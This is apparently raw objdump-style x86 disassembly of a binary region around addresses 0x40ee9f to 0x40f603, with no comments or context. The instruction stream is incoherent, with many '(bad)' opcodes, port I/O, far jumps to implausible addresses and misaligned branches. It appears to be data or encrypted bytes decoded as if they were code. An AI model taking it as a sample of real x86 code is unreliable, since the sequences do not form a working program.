  40ee9f:	or     dl,BYTE PTR [eax-0x2a]
  40eea2:	add    esi,DWORD PTR [esi+0x63]
  40eea5:	xor    ebx,ebx
  40eea7:	xor    bh,ah
  40eea9:	js     0x40ee73
  40eeab:	not    DWORD PTR fs:[ebp-0x3b]
  40eeaf:	sub    esi,DWORD PTR [ecx-0x7]
  40eeb2:	inc    esi
  40eeb3:	int3   
  40eeb4:	and    dh,bl
  40eeb6:	mov    esp,0xdc8d73bc
  40eebb:	jae    0x40ef18
  40eebd:	stc    
  40eebe:	je     0x40ee42
  40eec0:	xchg   ebp,eax
  40eec1:	imul   ebp,DWORD PTR [esi],0x8
  40eec4:	and    al,0x55
  40eec6:	outs   dx,BYTE PTR ds:[esi]
  40eec7:	adc    eax,0xb0034c6f
  40eecc:	ficom  WORD PTR ds:0xc560ff80
  40eed2:	in     al,dx
  40eed3:	inc    edx
  40eed4:	push   edi
  40eed5:	rcl    BYTE PTR [edx],0x3e
  40eed8:	sahf   
  40eed9:	rcl    DWORD PTR [edi+0x31464aa5],1
  40eedf:	rcl    BYTE PTR [eax+eiz*1-0x37],cl
  40eee3:	hlt    
  40eee4:	jbe    0x40ef51
  40eee6:	xor    al,BYTE PTR ds:0xd4807d42
  40eeec:	add    eax,0x39607ca0
  40eef1:	add    eax,ebx
  40eef3:	dec    ebx
  40eef4:	(bad)  
  40eef5:	(bad)  
  40eef6:	cwde   
  40eef7:	jmp    0x40ee88
  40eef9:	lea    eax,[ebp-0x42]
  40eefc:	xor    eax,0xd4f6b455
  40ef01:	test   BYTE PTR ds:[eax+0x27],0xf0
  40ef06:	sbb    eax,DWORD PTR [ecx+0x55347417]
  40ef0c:	cmp    ebp,DWORD PTR [edi]
  40ef0e:	int    0xac
  40ef10:	sbb    eax,edi
  40ef12:	in     eax,dx
  40ef13:	std    
  40ef14:	push   ebp
  40ef15:	pop    es
  40ef16:	stc    
  40ef17:	mov    bh,BYTE PTR [esp+edi*1+0x31]
  40ef1b:	mov    es,WORD PTR [ecx+eiz*8]
  40ef1e:	stos   DWORD PTR es:[edi],eax
  40ef1f:	mov    DWORD PTR [ecx],edi
  40ef21:	jg     0x40eef6
  40ef23:	sbb    esp,DWORD PTR [eax+0x472c46f0]
  40ef29:	jmp    0x8a4eca03
  40ef2e:	xchg   esi,eax
  40ef2f:	and    eax,0x5af31522
  40ef34:	pop    esp
  40ef35:	push   ebp
  40ef36:	outs   dx,DWORD PTR ds:[esi]
  40ef37:	inc    edi
  40ef38:	dec    ebx
  40ef39:	mov    al,0xe6
  40ef3b:	loop   0x40ef21
  40ef3d:	add    BYTE PTR gs:[esi],ch
  40ef40:	mov    edi,ebx
  40ef42:	out    dx,eax
  40ef43:	mov    gs,WORD PTR [ecx-0x2da27d10]
  40ef49:	mov    ah,0xea
  40ef4b:	hlt    
  40ef4c:	ret    
  40ef4d:	into   
  40ef4e:	mov    esi,0xc05e3a68
  40ef53:	sbb    BYTE PTR [eax-0x5aa25e20],dl
  40ef59:	rcl    BYTE PTR [edx+0x6e],cl
  40ef5c:	xor    al,0x5e
  40ef5e:	cmp    bh,BYTE PTR [edi+0x69]
  40ef61:	mov    bl,0x3a
  40ef63:	jnp    0x40ef87
  40ef65:	cmp    DWORD PTR [edx-0x7203e673],ebx
  40ef6b:	xor    eax,0x2c345d22
  40ef70:	not    BYTE PTR [ebp+0x2ee5843b]
  40ef76:	lock inc edx
  40ef78:	mul    DWORD PTR [eax-0x3ff940bf]
  40ef7e:	int    0x4d
  40ef80:	mov    ebx,0xbad1c0a
  40ef85:	jb     0x40ef94
  40ef87:	jne    0x40efea
  40ef89:	jno    0x40efbe
  40ef8b:	jl     0x40ef31
  40ef8d:	out    dx,eax
  40ef8e:	mov    gs,WORD PTR ds:0x272d6600
  40ef94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef95:	les    edx,FWORD PTR [ebp+0x68]
  40ef98:	popf   
  40ef99:	cdq    
  40ef9a:	jmp    0x40ef69
  40ef9c:	or     bl,ch
  40ef9e:	shr    BYTE PTR [eax],1
  40efa0:	jne    0x40ef85
  40efa2:	retf   
  40efa3:	mov    dh,0xa0
  40efa5:	out    dx,eax
  40efa6:	inc    edi
  40efa7:	out    0x29,eax
  40efa9:	jae    0x40efce
  40efab:	sbb    BYTE PTR [edx],dh
  40efad:	pop    es
  40efae:	pop    ebx
  40efaf:	xor    ebp,DWORD PTR [edi+0x51]
  40efb2:	nop
  40efb3:	adc    ebp,esi
  40efb5:	loop   0x40ef77
  40efb7:	dec    esp
  40efb8:	adc    ah,bh
  40efba:	es push esi
  40efbc:	push   edx
  40efbd:	dec    esp
  40efbe:	mov    eax,DWORD PTR [ebx-0x1847d8be]
  40efc4:	jl     0x40ef87
  40efc6:	adc    bl,cl
  40efc8:	xchg   ebp,ecx
  40efca:	in     eax,0xe5
  40efcc:	cs xor al,0x15
  40efcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efd0:	and    ebp,DWORD PTR [edx+edi*1]
  40efd3:	mov    ebp,0xa8a6a95c
  40efd8:	inc    ecx
  40efd9:	shr    esp,1
  40efdb:	dec    ecx
  40efdc:	nop
  40efdd:	and    DWORD PTR [esi-0x4e],edx
  40efe0:	adc    al,0xc7
  40efe2:	inc    esp
  40efe3:	jl     0x40ef67
  40efe5:	pop    esp
  40efe6:	push   0x2d
  40efe8:	cwde   
  40efe9:	jmp    0x43c8a1c8
  40efee:	and    ebx,esp
  40eff0:	dec    ebx
  40eff1:	jno    0x40f051
  40eff3:	sbb    ah,BYTE PTR [eax]
  40eff5:	jle    0x40efd1
  40eff7:	cmp    al,0x3f
  40eff9:	mov    ah,0x79
  40effb:	push   ss
  40effc:	jne    0x40eff2
  40effe:	test   al,0x13
  40f000:	std    
  40f001:	xchg   edx,eax
  40f002:	pop    ebx
  40f003:	mov    gs,WORD PTR [esi-0x4d6e40bc]
  40f009:	mov    bl,0x4f
  40f00b:	mov    esp,0xa3ab4966
  40f010:	sar    BYTE PTR [ebx+0x73c0061e],0x2e
  40f017:	mov    dh,0x7f
  40f019:	test   BYTE PTR [eax+ebx*4-0x1a],bh
  40f01d:	shr    DWORD PTR [ecx+ebx*4-0x6f],1
  40f021:	or     al,0x96
  40f023:	push   es
  40f024:	outs   dx,DWORD PTR ds:[esi]
  40f025:	mov    ch,0x25
  40f027:	aaa    
  40f028:	add    al,0xdc
  40f02a:	xchg   ecx,eax
  40f02b:	lds    eax,FWORD PTR [edx+0x199b5086]
  40f031:	addr16 push edx
  40f033:	out    dx,al
  40f034:	sub    BYTE PTR [edx-0xf350a75],al
  40f03a:	sbb    dl,BYTE PTR [esi+0x3a]
  40f03d:	daa    
  40f03e:	cwde   
  40f03f:	adc    al,0xde
  40f041:	pop    es
  40f042:	out    dx,al
  40f043:	mov    dh,dh
  40f045:	loopne 0x40f07c
  40f047:	sbb    BYTE PTR [eax-0x11],bh
  40f04a:	clc    
  40f04b:	pop    edi
  40f04c:	jmp    0x2e85f0a
  40f051:	mov    bh,0x88
  40f053:	jnp    0x40f02a
  40f055:	fs inc esi
  40f057:	sahf   
  40f058:	jns    0x40f089
  40f05a:	sbb    BYTE PTR [eax+ebp*4+0x1d],bh
  40f05e:	push   esp
  40f05f:	retf   0xd4ae
  40f062:	pop    ecx
  40f063:	push   esi
  40f064:	jg     0x40f0c5
  40f066:	and    DWORD PTR [edi+0x6415deac],edx
  40f06c:	xchg   ebp,eax
  40f06d:	mov    ds:0xbbf9698c,al
  40f072:	inc    ebp
  40f073:	dec    edi
  40f074:	out    dx,al
  40f075:	mov    ds:0xa6fe4538,eax
  40f07a:	push   es
  40f07b:	jmp    0xfc16c03a
  40f080:	scas   eax,DWORD PTR es:[edi]
  40f081:	push   edx
  40f082:	aas    
  40f083:	data16 mov ch,0xe7
  40f086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f087:	jne    0x40f0a5
  40f089:	sbb    al,bl
  40f08b:	xchg   DWORD PTR [ecx*4+0x7e681901],esi
  40f092:	fcomi  st,st(5)
  40f094:	mov    ebx,0xaf7ad82c
  40f099:	scas   al,BYTE PTR es:[edi]
  40f09a:	dec    eax
  40f09b:	fld    QWORD PTR [edx+esi*2-0x17]
  40f09f:	xlat   BYTE PTR ds:[ebx]
  40f0a0:	jo     0x40f0ec
  40f0a2:	in     al,dx
  40f0a3:	aad    0xe
  40f0a5:	pusha  
  40f0a6:	cmp    al,0xf2
  40f0a8:	aam    0x78
  40f0aa:	jno    0x40f030
  40f0ac:	sub    ebp,eax
  40f0ae:	stos   BYTE PTR es:[edi],al
  40f0af:	retf   
  40f0b0:	sbb    DWORD PTR [eax],ebx
  40f0b2:	cmp    eax,0x62d4a216
  40f0b7:	outs   dx,DWORD PTR ds:[esi]
  40f0b8:	nop
  40f0b9:	into   
  40f0ba:	fcom   QWORD PTR [ebx-0x22]
  40f0bd:	cld    
  40f0be:	and    ah,bl
  40f0c0:	outs   dx,BYTE PTR ds:[esi]
  40f0c1:	sbb    al,0x94
  40f0c3:	cmp    BYTE PTR [eax+0x76a08613],bh
  40f0c9:	inc    esp
  40f0ca:	mov    dl,0x83
  40f0cc:	cli    
  40f0cd:	xchg   edx,eax
  40f0ce:	inc    eax
  40f0cf:	adc    bh,al
  40f0d1:	mov    ecx,0xa73616b0
  40f0d6:	and    al,0x30
  40f0d8:	imul   edx,DWORD PTR [esi-0x66],0x256563ac
  40f0df:	lods   al,BYTE PTR ds:[esi]
  40f0e0:	jno    0x40f0a2
  40f0e2:	ja     0x40f14f
  40f0e4:	sbb    al,0x5b
  40f0e6:	mov    WORD PTR [ecx+0x72],gs
  40f0e9:	push   0x5d
  40f0eb:	mov    ch,0x5e
  40f0ed:	or     eax,0x906c46dc
  40f0f2:	mov    bl,BYTE PTR ds:0x5b1daaf
  40f0f8:	sub    dh,ch
  40f0fa:	das    
  40f0fb:	mov    ecx,0x2381a747
  40f100:	sbb    ch,BYTE PTR [eax+edi*4]
  40f103:	aaa    
  40f104:	sbb    BYTE PTR [eax+0x7347be7c],al
  40f10a:	xchg   ebx,eax
  40f10b:	sbb    eax,0xf5f30e65
  40f110:	retf   
  40f111:	in     al,0x55
  40f113:	les    esi,FWORD PTR [eax]
  40f115:	mov    edi,0x52d0e97
  40f11a:	dec    edx
  40f11b:	xchg   edi,eax
  40f11c:	adc    eax,0x58fce485
  40f121:	push   esi
  40f122:	fwait
  40f123:	xchg   ecx,eax
  40f124:	pusha  
  40f125:	in     al,dx
  40f126:	and    eax,0x466ef422
  40f12b:	stos   BYTE PTR es:[edi],al
  40f12c:	add    al,0x5c
  40f12e:	or     esi,ecx
  40f130:	sub    eax,0xc8eb5f04
  40f135:	cmp    DWORD PTR [ecx-0x409a855c],eax
  40f13b:	fwait
  40f13c:	test   al,0x24
  40f13e:	add    eax,0x9767adda
  40f143:	inc    ebp
  40f144:	xchg   BYTE PTR [esi+0x6031eaad],dh
  40f14a:	xor    eax,0xebd2b3a2
  40f14f:	fcomp  QWORD PTR [esi]
  40f151:	mov    bl,ah
  40f153:	xchg   edx,eax
  40f154:	dec    edi
  40f155:	idiv   edi
  40f157:	xchg   BYTE PTR [edi+0x4fb1a4b8],bl
  40f15d:	mov    bl,0xc4
  40f15f:	adc    DWORD PTR ds:0xb8330849,0x198f8ada
  40f169:	pop    ss
  40f16a:	dec    edi
  40f16b:	outs   dx,BYTE PTR ds:[esi]
  40f16c:	jnp    0x40f1e7
  40f16e:	push   eax
  40f16f:	loop   0x40f0f3
  40f171:	and    ebx,edx
  40f173:	aam    0x45
  40f175:	icebp  
  40f176:	call   0xe4c1b705
  40f17b:	mov    ecx,0x1e084cd4
  40f180:	dec    ecx
  40f181:	cs add DWORD PTR cs:[si+0x18],ecx
  40f187:	and    al,0x4d
  40f189:	adc    bh,cl
  40f18b:	adc    ebx,esp
  40f18d:	adc    DWORD PTR [ebx-0x79daca64],esp
  40f193:	cmp    BYTE PTR cs:[ebx-0xc],bh
  40f197:	cmc    
  40f198:	inc    ecx
  40f199:	or     ebx,ecx
  40f19b:	in     eax,0x9d
  40f19d:	mov    ah,BYTE PTR [esp+eax*1-0x41]
  40f1a1:	xchg   edi,eax
  40f1a2:	ins    BYTE PTR es:[edi],dx
  40f1a3:	jl     0x40f164
  40f1a5:	pop    edi
  40f1a6:	mov    BYTE PTR [edx],ah
  40f1a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1a9:	push   esi
  40f1aa:	mov    esi,0xfcf2f1d3
  40f1af:	shl    DWORD PTR [ebx+0x246c2434],1
  40f1b5:	dec    esi
  40f1b6:	jmp    0x40f173
  40f1b8:	sub    bh,BYTE PTR [esi+0x7e3c4135]
  40f1be:	xor    BYTE PTR [esi+0x4df87e0],bh
  40f1c4:	arpl   WORD PTR [ebp+0x18],dx
  40f1c7:	mov    eax,ds:0x7d72db2e
  40f1cc:	fs push esp
  40f1ce:	shr    DWORD PTR [esi-0x14],0x21
  40f1d2:	stos   DWORD PTR es:[edi],eax
  40f1d3:	mov    esi,0xda9ac625
  40f1d8:	and    ebp,DWORD PTR ds:0xe143ad93
  40f1de:	jl     0x40f19f
  40f1e0:	fsubr  QWORD PTR [edi]
  40f1e2:	xlat   BYTE PTR ds:[ebx]
  40f1e3:	(bad)  
  40f1e4:	pop    eax
  40f1e5:	cmp    DWORD PTR [edx-0x8],ebx
  40f1e8:	retf   0x4ce8
  40f1eb:	scas   al,BYTE PTR es:[edi]
  40f1ec:	retf   0x5ce6
  40f1ef:	mov    WORD PTR [esi+0x51da2c35],ds
  40f1f5:	(bad)
  40f1f9:	mov    ebx,0xb4a88db6
  40f1fe:	jge    0x40f264
  40f200:	jae    0x40f1f4
  40f202:	(bad)  
  40f203:	js     0x40f223
  40f205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f206:	add    al,0xfe
  40f208:	jno    0x40f212
  40f20a:	jmp    0x40f1e5
  40f20c:	mov    edi,DWORD PTR [edx+0x32]
  40f20f:	sub    al,0x27
  40f211:	or     eax,0xf856ab33
  40f216:	sbb    edx,DWORD PTR [ecx]
  40f218:	retf   
  40f219:	sbb    DWORD PTR [eax-0x68],0xffffffe0
  40f21d:	ins    BYTE PTR es:[edi],dx
  40f21e:	outs   dx,DWORD PTR ds:[esi]
  40f21f:	sbb    DWORD PTR [edi+ebx*2],esp
  40f222:	test   al,0x15
  40f224:	jno    0x40f1f2
  40f226:	stc    
  40f227:	(bad)  
  40f228:	call   DWORD PTR [ecx]
  40f22a:	call   0x41e1:0x645dcc7c
  40f231:	fst    DWORD PTR [eax+0x2775f01]
  40f237:	push   0x4f
  40f239:	out    0x12,al
  40f23b:	aad    0x32
  40f23d:	aam    0xf2
  40f23f:	jg     0x40f1eb
  40f241:	cmp    DWORD PTR [esp+ecx*2-0x81297bc],eax
  40f248:	enter  0x47ae,0x2f
  40f24c:	scas   eax,DWORD PTR es:[edi]
  40f24d:	xchg   cl,al
  40f24f:	cmp    BYTE PTR es:[ecx],al
  40f252:	fst    st(1)
  40f254:	leave  
  40f255:	sbb    ecx,DWORD PTR [ebx-0x7a1f58cb]
  40f25b:	xchg   BYTE PTR [edi],dh
  40f25d:	and    al,0xe5
  40f25f:	rol    BYTE PTR [esi],cl
  40f261:	inc    ebx
  40f262:	xchg   esp,eax
  40f263:	or     eax,ebx
  40f265:	stos   BYTE PTR es:[edi],al
  40f266:	ret    0xd1ac
  40f269:	dec    ebp
  40f26a:	cdq    
  40f26b:	mov    eax,0x45cf0366
  40f270:	stc    
  40f271:	sub    al,dl
  40f273:	loopne 0x40f2f1
  40f275:	int3   
  40f276:	cmp    al,0x9
  40f278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f279:	and    al,0x89
  40f27b:	or     al,0x5c
  40f27d:	mov    edx,0x331355b3
  40f282:	out    0xca,al
  40f284:	pop    ecx
  40f285:	adc    DWORD PTR [edi-0xadaeeec],ebx
  40f28b:	int3   
  40f28c:	mov    ah,0x99
  40f28e:	mov    ebx,0x34042bb1
  40f293:	xchg   DWORD PTR [eax+ebp*2-0x6c],edx
  40f297:	xchg   ebp,eax
  40f298:	lds    ecx,FWORD PTR [eax+0x240fe168]
  40f29e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f29f:	adc    BYTE PTR [eax],ah
  40f2a1:	out    0x5a,eax
  40f2a3:	sub    eax,0x24def2b2
  40f2a8:	inc    ecx
  40f2a9:	scas   al,BYTE PTR es:[edi]
  40f2aa:	sub    al,0x27
  40f2ac:	sub    eax,0xc24106a1
  40f2b1:	add    eax,0x98d25655
  40f2b6:	rcl    BYTE PTR fs:[ebx+0x565c0811],cl
  40f2bd:	dec    ecx
  40f2be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2bf:	into   
  40f2c0:	aaa    
  40f2c1:	lea    edx,ss:[ecx]
  40f2c4:	loopne 0x40f340
  40f2c6:	push   edi
  40f2c7:	fisttp QWORD PTR [ebx]
  40f2c9:	or     DWORD PTR [ecx+edx*8],esp
  40f2cc:	cmp    BYTE PTR [eax-0x6006068],bh
  40f2d2:	pop    edx
  40f2d3:	loope  0x40f265
  40f2d5:	clc    
  40f2d6:	cdq    
  40f2d7:	sub    ch,BYTE PTR [esi]
  40f2d9:	lock mov ss,WORD PTR cs:[ecx+0x75]
  40f2de:	cmp    eax,DWORD PTR [edx+ecx*2]
  40f2e1:	sub    DWORD PTR [esi+edx*8-0x22018672],edi
  40f2e8:	xchg   esi,eax
  40f2e9:	daa    
  40f2ea:	adc    ah,BYTE PTR [edx+0x7e535449]
  40f2f0:	xchg   ecx,eax
  40f2f1:	jmp    0x40f2bf
  40f2f3:	sbb    ebp,ebx
  40f2f5:	test   al,0x52
  40f2f7:	and    dh,BYTE PTR [edx-0x32]
  40f2fa:	or     DWORD PTR [edi],ecx
  40f2fc:	test   cl,0xb7
  40f2ff:	or     ch,BYTE PTR [ecx-0x69]
  40f302:	mov    ah,0x13
  40f304:	jb     0x40f356
  40f306:	jbe    0x40f322
  40f308:	jbe    0x40f2e4
  40f30a:	in     al,0xe9
  40f30c:	or     eax,0xdc1aa6e8
  40f311:	imul   edx,DWORD PTR [ebp-0x1d],0x4eba30d1
  40f318:	pop    esp
  40f319:	pop    ds
  40f31a:	adc    al,BYTE PTR [ebp+ebp*8-0x5c]
  40f31e:	or     DWORD PTR [ebx-0x53],edx
  40f321:	mov    edx,DWORD PTR [ecx]
  40f323:	les    esi,FWORD PTR [esi-0x12]
  40f326:	fst    QWORD PTR [edx-0x7c]
  40f329:	adc    dh,BYTE PTR [edx]
  40f32b:	or     ah,al
  40f32d:	mov    al,ds:0xc127cf20
  40f332:	aad    0x8b
  40f334:	pop    ss
  40f335:	mov    dl,0x39
  40f337:	out    dx,al
  40f338:	fimul  DWORD PTR [esi+0xa3e34df]
  40f33e:	data16 jecxz 0x40f34d
  40f341:	sub    eax,0xad9e4a93
  40f346:	xor    edi,DWORD PTR [esi-0x79]
  40f349:	inc    ebx
  40f34a:	pop    ds
  40f34b:	pop    edi
  40f34c:	(bad)  
  40f34e:	xchg   ecx,eax
  40f34f:	lds    ebx,FWORD PTR [ecx]
  40f351:	add    ebx,DWORD PTR [ebx-0xd]
  40f354:	or     BYTE PTR [esp+esi*4],ch
  40f357:	leave  
  40f358:	push   ds
  40f359:	mov    ds:0x84531a4e,al
  40f35e:	jle    0x40f363
  40f360:	(bad)  
  40f361:	lods   eax,DWORD PTR ds:[esi]
  40f362:	inc    esp
  40f363:	test   DWORD PTR [esi-0x21],0xac6c658f
  40f36a:	in     al,0x57
  40f36c:	in     eax,dx
  40f36d:	jmp    0x48ff:0x370325ad
  40f374:	cwde   
  40f375:	mov    dh,0xeb
  40f377:	cmp    DWORD PTR [di-0x101e],edx
  40f37c:	sub    DWORD PTR [ebx-0x3b0ad67d],ecx
  40f382:	jp     0x40f33e
  40f384:	(bad)  
  40f386:	push   cs
  40f387:	mov    ds,WORD PTR [ecx-0x52]
  40f38a:	xchg   BYTE PTR [ecx+edx*2],ah
  40f38d:	sbb    DWORD PTR [ebx+0x5a],ebp
  40f390:	jb     0x40f3b8
  40f392:	mov    al,ds:0xfeb718e9
  40f397:	shl    BYTE PTR [edi-0x6bbc59dc],1
  40f39d:	jle    0x40f3cb
  40f39f:	ror    edi,cl
  40f3a1:	add    BYTE PTR [edi-0x5c5c3b27],cl
  40f3a7:	add    edi,DWORD PTR [ecx]
  40f3a9:	sub    BYTE PTR [edx],dh
  40f3ab:	jl     0x40f383
  40f3ad:	and    DWORD PTR [ecx-0x565e843],ecx
  40f3b3:	loopne 0x40f3a1
  40f3b5:	mov    WORD PTR [eax],?
  40f3b7:	jg     0x40f36e
  40f3b9:	cmp    BYTE PTR [ebp+0x70],bh
  40f3bc:	dec    esp
  40f3bd:	nop
  40f3be:	imul   esi,DWORD PTR [ecx-0x27],0xffffffa5
  40f3c2:	push   edx
  40f3c3:	pop    ebx
  40f3c4:	mov    esp,0xe0abc68b
  40f3c9:	out    dx,eax
  40f3ca:	scas   eax,DWORD PTR es:[edi]
  40f3cb:	jb     0x40f40f
  40f3cd:	xchg   ebp,eax
  40f3ce:	jnp    0x40f3d7
  40f3d0:	sbb    al,BYTE PTR [ebp+eiz*8+0x5630b7dc]
  40f3d7:	mov    ecx,0x3f69ab4d
  40f3dc:	daa    
  40f3dd:	in     eax,0xc6
  40f3df:	sbb    DWORD PTR [ebp-0xe],ebx
  40f3e2:	add    ebp,0x389ba78f
  40f3e8:	inc    edi
  40f3e9:	pop    ebx
  40f3ea:	jno    0x40f43d
  40f3ec:	into   
  40f3ed:	out    dx,eax
  40f3ee:	sbb    eax,esp
  40f3f0:	push   ebp
  40f3f1:	(bad)  
  40f3f3:	push   ds
  40f3f4:	popa   
  40f3f5:	imul   eax,DWORD PTR [edi+0x46],0xc70b3de1
  40f3fc:	call   0x1e377778
  40f401:	xchg   ecx,eax
  40f402:	xchg   ebp,edx
  40f404:	pop    ecx
  40f405:	(bad)  
  40f406:	adc    esi,DWORD PTR [ecx]
  40f408:	cld    
  40f409:	or     cl,dh
  40f40b:	lds    ebp,FWORD PTR [eax-0x1eef3a18]
  40f411:	xor    ah,BYTE PTR [edi-0x65514848]
  40f417:	cli    
  40f418:	imul   ecx,DWORD PTR [eax+0x31],0xffffffc2
  40f41c:	into   
  40f41d:	int    0x52
  40f41f:	pushf  
  40f420:	sahf   
  40f421:	lea    eax,[esi]
  40f423:	mov    cs,WORD PTR ds:[ebx+edx*4-0x7b]
  40f428:	xor    bh,bl
  40f42a:	cmp    dl,BYTE PTR [edx-0x42353a8d]
  40f430:	jbe    0x40f417
  40f432:	sub    al,BYTE PTR [esi]
  40f434:	mov    dh,0x6d
  40f436:	jmp    0xbba7:0x2ddf39d8
  40f43d:	jmp    WORD PTR [ebx+0x11619afe]
  40f444:	div    DWORD PTR [eax]
  40f446:	mov    eax,ds:0x54c95c1c
  40f44b:	and    ch,cl
  40f44d:	scas   al,BYTE PTR es:[edi]
  40f44e:	sbb    DWORD PTR [ecx],ecx
  40f450:	out    dx,eax
  40f451:	push   eax
  40f452:	xchg   esi,eax
  40f453:	fwait
  40f454:	sub    edx,ecx
  40f456:	sub    ebx,DWORD PTR [ebx]
  40f458:	xor    eax,0xb2a551e2
  40f45d:	adc    ah,BYTE PTR [ecx+0x3f]
  40f460:	ja     0x40f443
  40f462:	(bad)  
  40f463:	mov    cl,0x21
  40f465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f466:	and    eax,0x51a31ef6
  40f46b:	pop    esi
  40f46c:	xor    dl,BYTE PTR [eax-0x5bcd3667]
  40f472:	in     eax,dx
  40f473:	pusha  
  40f474:	xor    BYTE PTR ds:0xeae74e19,cl
  40f47a:	sbb    eax,0xbeaa78ae
  40f47f:	sub    BYTE PTR [edx],cl
  40f481:	jp     0x40f4dc
  40f483:	loopne 0x40f4c4
  40f485:	dec    ebp
  40f486:	mov    ds:0x16f9b14,al
  40f48b:	fld    st(3)
  40f48d:	sar    BYTE PTR [ebp+eax*2-0x74f699d4],cl
  40f494:	cmc    
  40f495:	sub    BYTE PTR [edi+0x5d],cl
  40f498:	mov    ds:0x24af685d,al
  40f49d:	(bad)  
  40f49e:	xchg   esp,eax
  40f49f:	pop    ss
  40f4a0:	fwait
  40f4a1:	or     DWORD PTR [ebp-0x2c],esp
  40f4a4:	into   
  40f4a5:	rcr    DWORD PTR cs:[ecx+0x25],1
  40f4a9:	mov    bl,0x6f
  40f4ab:	out    dx,eax
  40f4ac:	retf   0xd64e
  40f4af:	xor    eax,DWORD PTR [ebx+0x56]
  40f4b2:	mov    ebp,0xe0a2ee0a
  40f4b7:	jnp    0x40f4c2
  40f4b9:	daa    
  40f4ba:	imul   edx,esp,0x8394e298
  40f4c0:	sbb    ebx,edi
  40f4c2:	fucomp st(5)
  40f4c4:	int3   
  40f4c5:	inc    ebx
  40f4c6:	mov    BYTE PTR [edx],bl
  40f4c8:	into   
  40f4c9:	adc    BYTE PTR [eax+ebp*4],al
  40f4cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4cd:	xor    cl,BYTE PTR [ecx+0x180daf3b]
  40f4d3:	jmp    0x40f465
  40f4d5:	adc    esp,DWORD PTR [edi+ecx*1+0x6c]
  40f4d9:	fcmovb st,st(2)
  40f4db:	mov    esi,0x6fe62a50
  40f4e0:	jmp    0x4f7c2cca
  40f4e5:	data16 mov BYTE PTR ds:0xe8aa094b,bh
  40f4ec:	pop    ebp
  40f4ed:	loope  0x40f4a5
  40f4ef:	and    bl,al
  40f4f1:	das    
  40f4f2:	ret    
  40f4f3:	cmp    al,0x4b
  40f4f5:	dec    ecx
  40f4f6:	xchg   ebp,eax
  40f4f7:	mov    BYTE PTR [edi+0x34669540],ah
  40f4fd:	jl     0x40f4b7
  40f4ff:	mov    BYTE PTR [ebp+edi*4-0x56eaa41c],bl
  40f506:	icebp  
  40f507:	cs ds jo 0x40f55a
  40f50b:	fild   DWORD PTR [ebp-0x70a7a37]
  40f511:	mov    ds:0x9795d170,eax
  40f516:	gs call 0x777af48e
  40f51c:	add    eax,0x71db3d3
  40f521:	rcl    DWORD PTR [edi-0x44],1
  40f524:	fcmovnbe st,st(4)
  40f526:	jmp    0x557:0xbf9f5278
  40f52d:	leave  
  40f52e:	inc    bh
  40f530:	adc    BYTE PTR [ebx+0x73002c5c],al
  40f536:	retf   0x6a24
  40f539:	or     ebx,eax
  40f53b:	push   ds
  40f53c:	out    dx,al
  40f53d:	and    DWORD PTR [eiz*1-0x3e25a867],ebp
  40f544:	cli    
  40f545:	and    DWORD PTR [ebx+0x5e55fe8c],edx
  40f54b:	push   esp
  40f54c:	xor    al,BYTE PTR [ecx]
  40f54e:	mov    ds:0x99ce4ec5,eax
  40f553:	ja     0x40f529
  40f555:	and    al,0xe2
  40f557:	pop    esp
  40f558:	imul   ah
  40f55a:	jle    0x40f55a
  40f55c:	sbb    al,0x3f
  40f55e:	inc    edx
  40f55f:	dec    esp
  40f560:	pop    eax
  40f561:	fbstp  TBYTE PTR [eax]
  40f563:	nop
  40f564:	jae    0x40f518
  40f566:	sub    BYTE PTR [edi+0x41],al
  40f569:	lods   al,BYTE PTR ds:[esi]
  40f56a:	sub    eax,0x7d0d55a6
  40f56f:	pop    ebp
  40f570:	push   esp
  40f571:	aad    0x5c
  40f573:	mov    bl,0x4b
  40f575:	cli    
  40f576:	shr    DWORD PTR [ecx-0x51],cl
  40f579:	xchg   DWORD PTR [ecx-0x10ff6238],eax
  40f57f:	sbb    BYTE PTR [ecx+0x7f4e233e],al
  40f585:	test   eax,0x31b4cda3
  40f58a:	or     dl,BYTE PTR [esi]
  40f58c:	clc    
  40f58d:	inc    edi
  40f58e:	mov    edi,DWORD PTR [eax-0x2f]
  40f591:	pop    ecx
  40f592:	and    esi,DWORD PTR [edx]
  40f594:	daa    
  40f595:	je     0x40f5d9
  40f597:	adc    al,0x87
  40f599:	cmp    DWORD PTR [ecx-0x5862c6a2],eax
  40f59f:	cmp    DWORD PTR [eax+0x77],ebp
  40f5a2:	jp     0x40f578
  40f5a4:	push   eax
  40f5a5:	cmp    edi,ebp
  40f5a7:	dec    eax
  40f5a8:	dec    esi
  40f5a9:	cmc    
  40f5aa:	mov    BYTE PTR [eax],ah
  40f5ac:	cmc    
  40f5ad:	pop    edx
  40f5ae:	fld    TBYTE PTR [ecx+0x5c]
  40f5b1:	inc    esp
  40f5b2:	jl     0x40f537
  40f5b4:	xor    bl,al
  40f5b6:	mov    ds:0xeb4ff629,al
  40f5bb:	call   0x75ea:0x7ad25acf
  40f5c2:	or     cl,al
  40f5c4:	(bad)  
  40f5c5:	in     eax,0xc1
  40f5c7:	dec    esp
  40f5c8:	and    bl,bl
  40f5ca:	ds fcmove st,st(4)
  40f5cd:	dec    esp
  40f5ce:	sbb    al,0x30
  40f5d0:	lods   al,BYTE PTR ds:[esi]
  40f5d1:	out    dx,al
  40f5d2:	imul   edi,ebx,0xedf0df10
  40f5d8:	call   0x1b11:0x60ffa600
  40f5df:	test   bh,cl
  40f5e1:	idiv   BYTE PTR [ebx+0x26]
  40f5e4:	xchg   ebx,eax
  40f5e5:	mov    dl,bl
  40f5e7:	mov    ebp,0x78a20ea4
  40f5ec:	push   edx
  40f5ed:	jecxz  0x40f5d5
  40f5ef:	ret    0x2db7
  40f5f2:	sub    cl,BYTE PTR [esi-0x260246a8]
  40f5f8:	mov    bh,0x58
  40f5fa:	iret   
  40f5fb:	stos   DWORD PTR es:[edi],eax
  40f5fc:	adc    DWORD PTR [ebx-0x7506037e],esi
  40f602:	cdq    
  40f603:	xchg   edi,eax
